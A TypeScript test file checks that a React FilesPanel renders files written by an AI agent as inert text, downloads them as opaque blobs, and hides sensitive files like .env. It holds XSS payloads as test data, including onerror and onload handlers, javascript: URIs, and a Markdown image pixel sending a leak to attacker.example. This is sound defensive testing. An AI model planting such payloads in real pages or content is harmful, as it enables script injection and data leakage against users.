import { afterEach, describe, expect, it, vi } from "vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { MantineProvider } from "@mantine/core";
import type { WorkspaceFile } from "@atd/shared";
import { FilesPanel } from "./FilesPanel";

declare global {
  interface Window {
    pwned?: boolean;
  }
}

const XSS = `<img src=x onerror="window.pwned=true"><script>window.pwned=true</script><iframe src="javascript:window.pwned=true"></iframe>`;
// Mantine adds its own <style> and the icons are <svg>, so look for what the payloads would create.
const INJECTED = "img, script, iframe, object, embed, link, form, video, audio, a[href], [onerror], [onload]";

/** The opened file must be a single text node: no markup was parsed from it. */
function expectPlainText(container: HTMLElement, content: string) {
  const block = [...container.querySelectorAll("pre")].find((pre) => pre.textContent === content);
  expect(block).toBeDefined();
  expect(block!.children).toHaveLength(0);
}

function renderPanel(files: WorkspaceFile[], truncated = false) {
  return render(
    <MantineProvider>
      <FilesPanel files={files} truncated={truncated} />
    </MantineProvider>,
  );
}

const expand = (path: string) => fireEvent.click(screen.getByText(path));

afterEach(() => {
  delete window.pwned;
  vi.restoreAllMocks();
});

describe("FilesPanel", () => {
  it("shows HTML written by the agent as text, without creating any element", () => {
    const { container } = renderPanel([{ path: "index.html", size: XSS.length, content: XSS }]);
    expand("index.html");

    expectPlainText(container, XSS);
    expect(container.querySelector(INJECTED)).toBeNull();
    expect(window.pwned).toBeUndefined();
  });

  it("shows SVG and Markdown as text, so their scripts and remote images never load", () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" onload="window.pwned=true"><script>window.pwned=true</script></svg>`;
    const md = `# Hi\n![track](https://attacker.example/pixel.png?leak=1)\n[click](javascript:alert(1))`;
    const { container } = renderPanel([
      { path: "logo.svg", size: svg.length, content: svg },
      { path: "README.md", size: md.length, content: md },
    ]);
    expand("logo.svg");
    expand("README.md");

    expectPlainText(container, svg);
    expectPlainText(container, md);
    expect(container.querySelector(INJECTED)).toBeNull();
    expect(window.pwned).toBeUndefined();
  });

  it("shows markup in file names as text", () => {
    const path = `<img src=x onerror="window.pwned=true">.txt`;
    const { container } = renderPanel([{ path, size: 1, content: "x" }]);

    expect(screen.getByText(path)).toBeTruthy();
    expect(container.querySelector(INJECTED)).toBeNull();
    expect(window.pwned).toBeUndefined();
  });

  it("does not render file content until the row is opened", () => {
    renderPanel([{ path: "a.txt", size: 6, content: "SECRET" }]);
    expect(screen.queryByText("SECRET")).toBeNull();
    expand("a.txt");
    expect(screen.getByText("SECRET")).toBeTruthy();
  });

  it("downloads as an opaque file with a sanitized name, never opening it", () => {
    let blob: Blob | undefined;
    vi.spyOn(URL, "createObjectURL").mockImplementation((b) => {
      blob = b as Blob;
      return "blob:test";
    });
    vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
    const open = vi.spyOn(window, "open");
    let clicked: HTMLAnchorElement | undefined;
    vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function (this: HTMLAnchorElement) {
      clicked = this;
    });

    renderPanel([{ path: "site/index.html", size: XSS.length, content: XSS }]);
    fireEvent.click(screen.getByRole("button", { name: "Download site/index.html" }));

    expect(blob?.type).toBe("application/octet-stream");
    expect(clicked?.download).toBe("index.html");
    expect(clicked?.target).toBe("");
    expect(open).not.toHaveBeenCalled();
  });

  it("offers no content or download for skipped files", () => {
    renderPanel([
      { path: ".env", size: 40, skipped: "sensitive" },
      { path: "app.bin", size: 10, skipped: "binary" },
      { path: "node_modules", size: 0, skipped: "dir" },
    ]);

    expect(screen.queryByRole("button", { name: /^Download/ })).toBeNull();
    expect(screen.getByText("hidden")).toBeTruthy();
    expect(screen.getByText("binary")).toBeTruthy();
    expect(screen.getByText("Workspace files (2)")).toBeTruthy();
  });

  it("says when the list is incomplete", () => {
    renderPanel([], true);
    expect(screen.getByText(/Some files were left out/)).toBeTruthy();
  });
});
